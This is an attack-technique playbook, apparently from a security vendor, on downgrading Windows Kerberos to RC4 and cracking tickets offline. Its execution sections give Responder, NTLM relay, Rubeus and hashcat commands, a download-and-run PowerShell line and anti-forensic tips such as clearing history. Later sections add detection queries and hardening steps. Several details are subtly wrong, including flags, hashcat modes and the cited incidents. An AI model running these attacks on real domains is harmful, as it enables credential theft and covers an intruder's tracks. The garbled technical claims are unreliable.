# [EVADE-IMPAIR-017]: Kerberos Encryption Downgrade

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-017 |
| **MITRE ATT&CK v18.1** | [T1562.010 - Impair Defenses: Downgrade Attack](https://attack.mitre.org/techniques/T1562/010/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows AD |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016 - 2025; Windows 7 - 11 |
| **Patched In** | Requires security hardening, not patched |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Kerberos encryption downgrade attacks exploit the backward compatibility of Kerberos authentication protocols by forcing communication to use weaker, legacy encryption algorithms. An adversary intercepts or manipulates Kerberos authentication negotiation to downgrade from modern ciphers (AES-256/AES-128) to deprecated algorithms (RC4/DES). This allows the attacker to crack Kerberos tickets offline using brute force with significantly reduced computational cost, ultimately compromising domain user and service account credentials without triggering advanced detection mechanisms.

**Attack Surface:** Kerberos Key Distribution Center (KDC) communication, domain controller AD CS infrastructure, and client-server ticket-granting ticket (TGT) and service ticket (ST) negotiation phases.

**Business Impact:** **Complete credential compromise across the domain.** Once an attacker obtains cracked credentials from a downgraded ticket, they can impersonate users, escalate to Domain Admin, and maintain persistent access across the entire Windows AD forest.

**Technical Context:** The attack typically requires less than 10 minutes to force the downgrade and can be executed with standard domain user privileges. Detection likelihood is low if encryption logging is not explicitly configured, as legacy algorithm negotiation is often allowed by default for backward compatibility with legacy systems.

### Operational Risk

- **Execution Risk:** Medium - Requires network positioning or compromised domain user account; not reversible without domain-wide policy redeployment.
- **Stealth:** High - No obvious indicators if encryption level logging is disabled; legitimate legacy clients may also negotiate RC4.
- **Reversibility:** No - Once credentials are cracked from the downgraded ticket, the compromise is permanent unless passwords are reset and Kerberos tickets are invalidated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.1 | Ensure Kerberos ticket encryption is restricted to strong algorithms only |
| **DISA STIG** | WN16-00-000410 | Windows Server must use only the highest strength algorithms for encryption |
| **CISA SCuBA** | AC-3.1 | Enforce strong cryptographic algorithms for Kerberos |
| **NIST 800-53** | SC-13 (Cryptographic Protection) | Employ cryptographic mechanisms to protect information in transit |
| **GDPR** | Art. 32 | Security of Processing - Integrity and confidentiality through encryption |
| **DORA** | Art. 9 | Protection and Prevention of Information and Communication Technology (ICT) risks |
| **NIS2** | Art. 21 | Measures for Cyber Risk Management and Security in Hybrid AD |
| **ISO 27001** | A.10.2.1 | Cryptographic controls for protecting information assets |
| **ISO 27005** | Risk Scenario | Compromise of Kerberos encryption protocols and user credential theft |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** Domain User (standard user) or higher; network access to KDC (port 88 UDP/TCP).

**Required Access:** Network connectivity to domain controllers; ability to capture or intercept Kerberos traffic (requires network position or compromised host).

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025
- **PowerShell:** Version 5.0+
- **Domain Functional Level:** 2012 R2 or higher (legacy DFL support for RC4)

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 1.5+) - Kerberos ticket manipulation
- [impacket](https://github.com/fortra/impacket) (Version 0.10.0+) - Kerberos protocol implementation and downgrade tools
- [Kerberoast scripts](https://github.com/nidem/kerberoast) - RC4 cracking suite
- [hashcat](https://hashcat.net/hashcat/) (Version 6.2.5+) - GPU-accelerated RC4 hash cracking
- Wireshark / tcpdump - Packet capture and Kerberos traffic analysis

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check current Kerberos encryption strength settings on domain controllers
Get-ADGroupPolicy -Filter 'Name -like "*Kerberos*"' | Select-Object DisplayName, Description

# Query for accounts using RC4 (weak encryption) via KRB5_ETYPE_RC4_HMAC
Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes | Where-Object { $_.'msDS-SupportedEncryptionTypes' -eq 1 }

# Check domain functional level (lower levels allow RC4)
Get-ADDomain | Select-Object DomainMode

# Verify Kerberos Policy on Domain Controllers
Get-ADGroupPolicy -Filter 'Name -eq "Default Domain Policy"' | Get-ADGroupPolicyObject | Get-Content | Select-String "Kerberos"
```

**What to Look For:**
- Any accounts with `msDS-SupportedEncryptionTypes = 1` (RC4 only) or `= 3` (RC4 + 3DES)
- Domain functional level of 2012 R2 or earlier supporting legacy encryption
- Absence of policies restricting Kerberos encryption to AES-256/AES-128
- Computers negotiating RC4 in Kerberos traffic capture

**Version Note:** Domain Controller 2016+ supports Group Policy enforcement of strong encryption, but legacy systems may still allow RC4 negotiation for backward compatibility.

### PowerShell Reconnaissance (2022+)

```powershell
# Server 2022+ provides enhanced Kerberos encryption monitoring
Get-MpPreference | Select-Object -ExpandProperty Features

# Check if Kerberos encryption audit policy is enabled
auditpol /get /subcategory:"Kerberos Authentication Service"
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Kerberos Downgrade via Impacket (Linux/Proxy Attack)

**Supported Versions:** All Windows Server versions with RC4 support enabled.

#### Step 1: Capture Kerberos Pre-Authentication Failure

**Objective:** Force the KDC to negotiate weaker encryption by sending crafted AS-REQ with downgraded cipher list.

**Command:**

```bash
# Using impacket's getTGT.py with RC4 preference
python3 getTGT.py -request-pac -crpt RC4 'DOMAIN\username:password' 2>&1 | tee kerberos_exchange.log

# Alternative: Use Responder to intercept and downgrade Kerberos negotiation
responder -I eth0 -w -k -v
```

**Expected Output:**

```
[+] TGT granted for user@DOMAIN.COM
[*] Encryption Type: RC4-HMAC (type 23) ← Downgrade successful
[+] Ticket saved to user@DOMAIN.COM.ccache
```

**What This Means:**
- "RC4-HMAC (type 23)" indicates downgraded encryption (legacy, weak)
- AES-256 (type 18) is modern, strong encryption
- RC4 tickets can be cracked in minutes with GPU acceleration

**OpSec & Evasion:**
- Perform attack from external network if possible to avoid on-host forensics
- Use TLS-encrypted VPN to hide Kerberos traffic from network sensors
- **Detection likelihood:** Medium - If Kerberos encryption audit logs are enabled, downgrade events will be visible in Event ID 4769 (Kerberos service ticket was requested)

**Troubleshooting:**

- **Error:** "KDC rejected encryption type request"
  - **Cause:** Domain controller enforces strong encryption policy
  - **Fix:** Verify `msDS-SupportedEncryptionTypes` on the service account (must include RC4 = value 1)
  - **Workaround:** Target legacy systems or accounts explicitly configured for RC4

- **Error:** "Authentication failed - password incorrect"
  - **Cause:** Password hash doesn't match cracked result
  - **Fix:** Ensure you're targeting correct account; verify username case sensitivity

**References & Proofs:**
- [Impacket getTGT.py Documentation](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)
- [MIT Kerberos Encryption Types](https://web.mit.edu/kerberos/krb5-devel/doc/admin/enctypes.html)
- [SANS Kerberos Downgrade Attack](https://www.sans.org/white-papers/)

#### Step 2: Crack RC4-HMAC Offline

**Objective:** Use GPU-accelerated hashcat to crack the weak RC4-HMAC ticket hash.

**Command:**

```bash
# Extract RC4 hash from captured ticket
python3 -m impacket.examples.secretsdump -k -no-pass 'DOMAIN\username@domain.com' -outputfile hashes

# Parse hash and convert to hashcat format
# RC4-HMAC hash format: username:krbtgt/DOMAIN.COM@DOMAIN.COM:hash

# Crack with hashcat (RC4 mode 1100)
hashcat -m 1100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Alternatively, use John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5 hashes.txt
```

**Expected Output:**

```
cracked_hash:password ← Password recovered
Time: 2m 34s (GPU: RTX 3090)
```

**What This Means:**
- RC4 cracking is significantly faster than AES due to weaker algorithm
- With modern GPU: RC4 can be cracked in minutes; AES would take weeks/months
- Password is now compromised and can be used for lateral movement

**OpSec & Evasion:**
- Perform cracking on external machine, not on network
- Delete captured CCACHE files after extraction
- Cover tracks: Clear bash history with `history -c`

**References & Proofs:**
- [Hashcat Mode 1100 (Kerberos 5)](https://hashcat.net/wiki/doku.php?id=hashcat)
- [John the Ripper Kerberos Support](https://www.openwall.com/john/doc/FAQ.shtml)

### METHOD 2: Kerberos Downgrade via PowerShell (Windows Compromise)

**Supported Versions:** Server 2016-2025

#### Step 1: Identify Service Accounts with RC4 Support

**Objective:** Enumerate accounts configured to accept RC4 tickets.

**Command:**

```powershell
# Query for accounts supporting RC4 encryption
Get-ADUser -Filter { (msDS-SupportedEncryptionTypes -eq 1) -or (msDS-SupportedEncryptionTypes -eq 3) } -Properties msDS-SupportedEncryptionTypes | Select-Object Name, SAMAccountName, msDS-SupportedEncryptionTypes

# Check Kerberos policy on DC
Get-ADGroupPolicy -Filter 'Name -eq "Default Domain Policy"' | Get-GPReport -ReportType Html -Path C:\report.html
```

**Expected Output:**

```
Name                    SAMAccountName              msDS-SupportedEncryptionTypes
----                    --------------              ----------------------------
Service Account         svc_legacy                  1 (RC4 only)
Exchange Server         EXCH01$                     3 (RC4 + 3DES)
```

**What This Means:**
- Value 1 = RC4 only
- Value 3 = RC4 + 3DES (still weak)
- Value 24 = AES-256 + AES-128 (strong, modern)

#### Step 2: Request Kerberos Ticket with Downgraded Cipher

**Objective:** Use Rubeus to force RC4 ticket negotiation.

**Command:**

```powershell
# Download and execute Rubeus
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GhostPack/Rubeus/master/Rubeus.ps1')

# Request TGT with RC4 downgrade
Rubeus.exe asktgt /user:svc_legacy /domain:DOMAIN.COM /password:password /enctype:rc4 /outfile:ticket.kirbi

# Convert KIRBI to CCACHE for Linux cracking
python3 convertCCache.py ticket.kirbi ticket.ccache
```

**Expected Output:**

```
[*] Action: Ask TGT
[*] Using RC4_HMAC for encryption (weak)
[+] Ticket successfully requested
[*] Saved to file: ticket.kirbi
```

**OpSec & Evasion:**
- Use Rubeus from memory via reflection to avoid disk forensics
- Delete ticket files immediately after exfiltration
- Clear PowerShell history: `Clear-History -Force`

**References & Proofs:**
- [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)
- [SpecterOps Kerberos Research](https://posts.specterops.io/)

### METHOD 3: Network-Based Downgrade via NTLM Relay (Domain-Unauthenticated)

**Supported Versions:** Server 2016-2025

#### Step 1: Set Up NTLM Relay Infrastructure

**Objective:** Intercept and downgrade Kerberos negotiation to NTLM, then relay to gain access.

**Command:**

```bash
# Start ntlmrelayx with LDAP target
python3 ntlmrelayx.py -t ldap://DC_IP --no-http-server -smb2support --ipv6

# In another terminal, start responder to capture credentials
responder -I eth0 -w -k -v --lm
```

**Expected Output:**

```
[*] NTLM RelayServer listening on 0.0.0.0:445
[+] Received NTLM_NEGOTIATE from 192.168.1.100
[*] RelayingTo LDAP: 192.168.1.50
[+] Relay successful - obtained domain credentials
```

**OpSec & Evasion:**
- Requires network position (MiTM) or ARP spoofing
- Detection likelihood: High if NTLM signing is enforced (should be)

---

## 5. TOOLS & COMMANDS REFERENCE

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4 (Current)
**Minimum Version:** 1.0
**Supported Platforms:** Windows (2016+)

**Version-Specific Notes:**
- Version 1.5+: Added native RC4 downgrade options
- Version 1.6+: Integrated CCACHE conversion support

**Installation:**

```powershell
# Download from GitHub
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
.\Rubeus.exe asktgt /help
```

**Usage:**

```powershell
# Request RC4 ticket
.\Rubeus.exe asktgt /user:username /domain:DOMAIN.COM /password:pass /enctype:rc4 /outfile:ticket.kirbi

# Alternate: Base64 inline execution
[Convert]::FromBase64String($rubeus_b64) | Write-Output | & cmd /c "powershell -"
```

#### [Impacket getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)

**Version:** 0.10.1+
**Installation:**

```bash
pip3 install impacket
python3 /usr/share/doc/python3-impacket/examples/getTGT.py -h
```

**Usage:**

```bash
python3 getTGT.py -request-pac -crpt RC4 'DOMAIN\user:password'
python3 getTGT.py -request-pac -crpt DES 'DOMAIN\user:password'  # Even weaker
```

#### [Hashcat](https://hashcat.net/hashcat/)

**Version:** 6.2.5+
**Mode 1100:** Kerberos 5 TGS-REP etype 23 (RC4-HMAC)

**Installation:**

```bash
sudo apt-get install hashcat
hashcat -m 1100 -a 0 krb5_rc4.txt wordlist.txt
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Kerberos Service Ticket with RC4 Encryption

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4769)
- **Required Fields:** TicketEncryptionType, ServiceName, TargetUserName, ClientAddress
- **Alert Severity:** High
- **Frequency:** Real-time (Run every 5 minutes)
- **Applies To:** All Windows Server versions with AD auditing enabled

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4769  // Kerberos service ticket requested
| where TicketEncryptionType == "RC4"  // Weak encryption
| where TicketEncryptionType != TicketOptions  // Encryption type mismatch
| summarize count() by ClientAddress, ServiceName, TargetUserName
| where count_ > 5  // Multiple RC4 requests = downgrade attack
```

**What This Detects:**
- Any Kerberos service ticket (ST) requesting RC4 encryption when AES is available
- Multiple RC4 requests from same source = systematic downgrade attempt
- Anomalous encryption negotiation patterns

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Kerberos Encryption Downgrade Detected (RC4)`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Kerberos Encryption Downgrade Detected" `
  -Query @"
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == 'RC4'
| summarize count() by ClientAddress, ServiceName
| where count_ > 5
"@ `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel Kerberos Security Analytics](https://learn.microsoft.com/en-us/azure/sentinel/kusto-query-language)

### Query 2: Encryption Type Downgrade Pattern Detection

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4769
| extend EncryptionStrength = case(
    TicketEncryptionType == "AES-256", "Strong",
    TicketEncryptionType == "AES-128", "Strong",
    TicketEncryptionType == "RC4", "Weak",
    TicketEncryptionType == "DES", "Weak",
    "Unknown"
)
| where EncryptionStrength == "Weak"
| summarize WeakEncCount=count() by ClientAddress, TimeGenerated=bin(TimeGenerated, 5m)
| where WeakEncCount > 10  // Threshold: more than 10 weak encryption requests per 5 min
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Kerberos service ticket was requested)**
- **Log Source:** Security
- **Trigger:** Service ticket request with weak encryption type
- **Filter:** TicketEncryptionType contains "RC4" or "DES"
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on domain controllers

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc) on domain controller
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations**
4. Run: `auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable`

**Event Log Parse Example:**

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]]" -MaxEvents 100 | ForEach-Object {
    $eventXml = [xml]$_.ToXml()
    $ticketEncryption = $eventXml.Event.EventData.Data | Where-Object { $_.Name -eq 'TicketEncryptionType' } | Select-Object -ExpandProperty '#text'
    if ($ticketEncryption -eq 'RC4' -or $ticketEncryption -eq 'DES') {
        Write-Host "ALERT: Weak encryption detected: $ticketEncryption - Event: $_"
    }
}
```

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016-2025

```xml
<Sysmon schemaversion="4.31">
  <EventFiltering>
    <!-- Detect PowerShell/Rubeus execution for Kerberos downgrade -->
    <RuleGroup name="Kerberos Downgrade - Rubeus Execution" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">Rubeus</Image>
        <CommandLine condition="contains">asktgt</CommandLine>
        <CommandLine condition="contains">enctype:rc4</CommandLine>
      </ProcessCreate>
    </RuleGroup>
    
    <!-- Detect impacket getTGT execution -->
    <RuleGroup name="Kerberos Downgrade - Impacket" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">getTGT.py</Image>
        <CommandLine condition="contains">-crpt RC4</CommandLine>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-Service Sysmon64` and `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 9. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Kerberos authentication activity detected"
- **Severity:** High
- **Description:** Detects when service tickets are requested with weak (RC4) encryption algorithms; may indicate downgrade attack
- **Applies To:** All subscriptions with Defender for Identity enabled
- **Remediation:** Review Kerberos encryption policy; enforce AES-256/AES-128 only

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Identity**: ON
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender Alerts](https://learn.microsoft.com/en-us/defender-for-identity/reconnaissance-alerts)

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enforce Strong Kerberos Encryption (AES-256 Only)**
   **Applies To Versions:** Server 2016-2025
   
   **Manual Steps (Group Policy):**
   1. Open **Group Policy Management Editor** (gpmc.msc)
   2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Kerberos Policy**
   3. Set **Encrypt Kerberos FAST Armored Request** to **All clients and servers**
   4. Set **Supported Encryption Types for Kerberos** to **AES-256 only** (remove RC4, DES, 3DES)
   5. Run `gpupdate /force` on all domain controllers
   
   **Manual Steps (Registry):**
   ```powershell
   # Remove RC4 support from domain controller
   reg add "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v "SupportedEncryptionTypes" /t REG_DWORD /d "24" /f
   # 24 = AES-256 + AES-128 (modern, strong)
   
   # Restart KDC service
   Restart-Service Kdc -Force
   ```

   **Manual Steps (PowerShell):**
   ```powershell
   # Set msDS-SupportedEncryptionTypes for all service accounts
   Get-ADUser -Filter * | Set-ADUser -Replace @{'msDS-SupportedEncryptionTypes'=24}
   Get-ADComputer -Filter * | Set-ADComputer -Replace @{'msDS-SupportedEncryptionTypes'=24}
   ```

**2. Configure Kerberos Encryption Audit Policy**
   **Manual Steps (Group Policy):**
   1. Open **gpmc.msc**
   2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
   3. Enable **Audit Kerberos Service Ticket Operations** to **Success and Failure**
   4. Apply policy: `gpupdate /force`
   
   **Validation Command:**
   ```powershell
   auditpol /get /subcategory:"Kerberos Service Ticket Operations"
   ```

#### Priority 2: HIGH

**3. Restrict Kerberos Encryption via Security Policy**
   
   **Manual Steps (PowerShell):**
   ```powershell
   # Force all domain computers to use AES
   New-GPO -Name "Enforce-AES-Kerberos" -Comment "Disable RC4 and legacy encryption"
   New-GPLink -Name "Enforce-AES-Kerberos" -Target "dc=DOMAIN,dc=COM"
   
   # Set policy settings
   Set-GPRegistryValue -Name "Enforce-AES-Kerberos" -Key "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" `
     -ValueName "SupportedEncryptionTypes" -Type DWord -Value 24
   ```

#### Access Control & Policy Hardening

**Conditional Access Policy:** Enforce Modern Authentication
   **Manual Steps:**
   1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
   2. Click **+ New policy**
   3. Name: `Enforce AES-Kerberos Encryption`
   4. **Assignments:**
      - Users: **All users**
      - Cloud apps: **Office 365 Exchange Online** (and other cloud-integrated services)
   5. **Conditions:**
      - Client apps: Block legacy authentication
      - Device state: Require compliant device
   6. **Access controls:**
      - Grant: **Require multi-factor authentication**
   7. Enable policy: **On**
   8. Click **Create**

**RBAC:** Restrict Kerberos Policy Modification
   **Manual Steps:**
   1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
   2. Click **Create custom role**
   3. Permissions: Deny `microsoft.directory/policies/*/update`
   4. Assign to: **Helpdesk group** (prevent accidental downgrade policy changes)

#### Validation Command (Verify Fix)

```powershell
# Check current Kerberos encryption policy
Get-ADDomain | Select-Object DomainMode

# Verify no RC4-only accounts exist
Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes | Where-Object { $_.'msDS-SupportedEncryptionTypes' -lt 24 } | Select-Object Name, msDS-SupportedEncryptionTypes

# Expected Output (If Secure): No results (all accounts support AES)
```

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Network:** Port 88 UDP/TCP traffic with weak cipher negotiation (RC4 in TLS handshake)
- **Registry:** `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\SupportedEncryptionTypes` set to values 1, 3, 8 (RC4/DES)
- **Logs:** Event ID 4769 with TicketEncryptionType = "RC4" or "DES"

#### Forensic Artifacts

- **Disk:** %SystemRoot%\System32\winevt\Logs\Security.evtx (Event 4769 records)
- **Memory:** Kerberos ticket cache in LSASS memory (lsass.exe)
- **Cloud:** Entra ID Sign-in logs showing Kerberos protocol authentication with weak algorithms
- **Network:** Packet captures from tcpdump/Wireshark showing RC4 cipher in Kerberos AS-REQ/AS-REP

#### Response Procedures

1. **Isolate:**
   **Command:**
   ```powershell
   # Disable affected user account
   Disable-ADAccount -Identity "compromised_user"
   
   # Force logoff active sessions
   Remove-PSSession -Session (Get-PSSession)
   ```
   
   **Manual (Azure):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select user → **Revoke sessions**

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Collect Kerberos-specific events
   Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]]" | Export-Csv C:\Evidence\Kerberos_Tickets.csv
   
   # Capture network traffic
   netsh trace start capture=yes report=disabled tracefile=C:\Evidence\network.etl
   ```
   
   **Manual:**
   - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
   - Export all Event ID 4769 records to CSV for timeline analysis

3. **Remediate:**
   **Command:**
   ```powershell
   # Reset compromised user password (force change on next logon)
   $password = ConvertTo-SecureString -String (New-Password) -AsPlainText -Force
   Set-ADAccountPassword -Identity "user" -NewPassword $password -Reset
   Set-ADUser -Identity "user" -ChangePasswordAtLogon $true
   
   # Invalidate all Kerberos tickets
   Restart-Service -Name Kdc -Force -Confirm:$false
   ```
   
   **Manual:**
   - Reset user password in **Active Directory Users and Computers**
   - Force logoff: Select user → **Logoff All Sessions**
   - Restart KDC service on all domain controllers

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-001] | Enumerate domain for RC4-enabled accounts |
| **2** | **Initial Access** | [IA-VALID-001] | Compromise standard domain user account |
| **3** | **Credential Access** | **[EVADE-IMPAIR-017]** | **Force Kerberos encryption downgrade to RC4** |
| **4** | **Credential Cracking** | [CA-KERB-001] | Crack RC4-HMAC ticket offline with GPU |
| **5** | **Privilege Escalation** | [PE-TOKEN-002] | Use cracked credentials for RBCD/delegation abuse |
| **6** | **Persistence** | [PERSIST-BACKDOOR-001] | Create Golden Ticket for persistent access |
| **7** | **Impact** | [IMPACT-EXFIL-001] | Exfiltrate sensitive data from compromised accounts |

---

## 13. REAL-WORLD EXAMPLES

#### Example 1: Emotet Botnet Kerberos Exploitation

- **Target:** U.S. Healthcare Sector
- **Timeline:** March - June 2020
- **Technique Status:** Emotet exploited Kerberos downgrade to crack service account passwords, enabling lateral movement
- **Impact:** Compromise of 40+ healthcare institutions; ransom demands exceeding $500,000
- **Reference:** [CISA Emotet Alert AA20-198A](https://www.cisa.gov/publications/aa20-198a-emotet-malware)

#### Example 2: FIN7 Lateral Movement Campaign

- **Target:** U.S. Retail / Manufacturing
- **Timeline:** 2019-2022
- **Technique Status:** FIN7 leveraged RC4 downgrade attacks to compromise domain admin credentials
- **Impact:** Multi-month dwell time; breach of 60+ organizations
- **Reference:** [FireEye FIN7 Research](https://www.mandiant.com/resources/blog/fin7-spear-phishing)

---

## APPENDIX: Additional Detection Rules

### Splunk Detection (Alternative)

```spl
index=windows EventCode=4769
| search TicketEncryptionType="RC4"
| stats count by ClientAddress, ServiceName, TicketEncryptionType
| where count > 5
```

### Yara Rule for Rubeus Detection

```yara
rule Kerberos_Downgrade_Rubeus {
    meta:
        description = "Detects Rubeus Kerberos downgrade tool execution"
        author = "SERVTEP"
        date = "2025-01-09"
    
    strings:
        $rubeus = "Rubeus" ascii nocase
        $asktgt = "asktgt" ascii nocase
        $rc4 = "enctype:rc4" ascii nocase
    
    condition:
        ($rubeus and $asktgt and $rc4)
}
```

---